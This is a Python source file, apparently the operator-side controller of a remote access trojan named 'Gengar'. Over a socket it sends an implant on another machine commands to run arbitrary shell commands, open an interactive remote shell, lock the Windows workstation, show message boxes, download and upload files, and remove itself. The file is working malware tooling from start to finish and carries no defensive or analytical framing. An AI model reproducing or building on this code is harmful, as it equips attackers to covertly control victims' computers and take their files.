import json


class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def _send(self, data):
        self._sock.send(str(len(data)).encode())
        self._sock.send(data.encode())

    def _recv(self, binary=False):
        buff_len = int(self._sock.recv(128).decode())
        if binary:
            return self._sock.recv(buff_len)
        else:
            return self._sock.recv(buff_len).decode().strip()

    def shell(self, cmd):
        payload = json.dumps(dict(cmd='shell', content=cmd))
        self._send(payload)
        return self._recv()

    def lock_workstation(self):
        self.shell('rundll32 user32.dll,LockWorkStation')

    def msgbox(self, title, content):
        payload = json.dumps(dict(cmd='msgbox', title=title, content=content))
        self._send(payload)

    def download(self, remote_path, local_path):
        payload = json.dumps(dict(cmd='download', path=remote_path))
        self._send(payload)
        with open(local_path, 'wb') as _file:
            _file.write(self._recv(binary=True))

    def upload(self, local_path, remote_path):
        payload = json.dumps(dict(cmd='upload', path=remote_path, data=open(local_path, 'rb').read().decode()))
        self._send(payload)

    def suicide(self):
        payload = json.dumps(dict(cmd='suicide'))
        self._send(payload)
        self._sock.close()

    def hostname(self):
        return self.shell('hostname')

    def interactive_shell(self):
        while True:
            shell_cmd = input(f'{self.hostname()}$ ')
            if shell_cmd == 'exit':
                print('Exiting')
                break
            print(self.shell(shell_cmd))

    def is_alive(self):
        try:
            self.shell('test')
            return True
        except ConnectionResetError:
            return False

    def __repr__(self):
        ip, port = self._sock.getpeername()
        return f'Gengar at {ip}'
